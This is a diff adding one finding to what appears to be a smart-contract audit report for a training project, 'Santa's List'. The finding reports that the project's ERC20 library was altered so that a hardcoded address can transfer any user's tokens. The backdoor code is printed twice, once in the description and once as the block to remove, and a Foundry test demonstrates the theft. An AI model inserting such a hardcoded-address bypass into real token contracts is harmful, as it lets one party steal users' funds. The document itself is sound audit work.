@@ -159,3 +159,55 @@ instead of `uint256 private s_tokenCounter;`
 use `mapping(address person => uint256 countOfSantasPresentClaimed) private s_tokenCounter;`
 
 and in the `_mintAndIncrement()` function, adjust the `s_tokenCounter` to `s_tokenCounter[msg.sender]++`
+
+### [H-5] Corrupted ERC20 library used in `SantaToken` allows an specific address to steal users balances
+
+**Description** The `ERC20.sol` inherited by `SantaToken.sol` has been edited to allow address "0x815F577F1c1bcE213c012f166744937C889DAF17" to freely move around SantaToken.
+
+```javascript
+        if (msg.sender == 0x815F577F1c1bcE213c012f166744937C889DAF17) {
+            balanceOf[from] -= amount;
+            unchecked {
+                balanceOf[to] += amount;
+            }
+            emit Transfer(from, to, amount);
+            return true;
+        }
+```
+
+**Impact** Dwarf can ruin everyone's Christmas by stealing their tokens to his wallet
+
+**Proof of Concepts**
+
+```javascript
+function testSantaTokenCanBeExploited() public {
+        address dwarf = address(0x815F577F1c1bcE213c012f166744937C889DAF17);
+        vm.startPrank(santa);
+        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
+        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
+        vm.stopPrank();
+
+        vm.startPrank(user);
+        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
+        santasList.collectPresent();
+        vm.stopPrank();
+
+        vm.startPrank(dwarf);
+        santaToken.transferFrom(user, dwarf, 1e18);
+        assertEq(santaToken.balanceOf(dwarf), 1e18);
+        assertEq(santaToken.balanceOf(user), 0);
+    }
+```
+
+**Recommended mitigation** Fire the dwarf and remove this portion in `ERC20.sol`
+
+```javascript
+        if (msg.sender == 0x815F577F1c1bcE213c012f166744937C889DAF17) {
+            balanceOf[from] -= amount;
+            unchecked {
+                balanceOf[to] += amount;
+            }
+            emit Transfer(from, to, amount);
+            return true;
+        }
+```
